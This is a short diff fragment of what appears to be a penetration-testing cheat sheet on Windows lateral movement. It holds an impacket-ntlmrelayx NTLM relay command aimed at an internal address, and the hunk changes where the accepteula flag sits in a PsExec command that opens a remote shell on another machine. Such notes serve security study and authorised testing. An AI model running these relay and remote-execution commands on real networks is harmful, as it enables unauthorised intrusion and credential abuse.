@@ -453,7 +453,7 @@ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c
 
 # OTH
 net use \\files04
-.\PsExec64.exe --accepteula \\PC1 cmd
+.\PsExec64.exe \\PC1 cmd --accepteula
 ```
 ## WMI winRM
 ```powershell
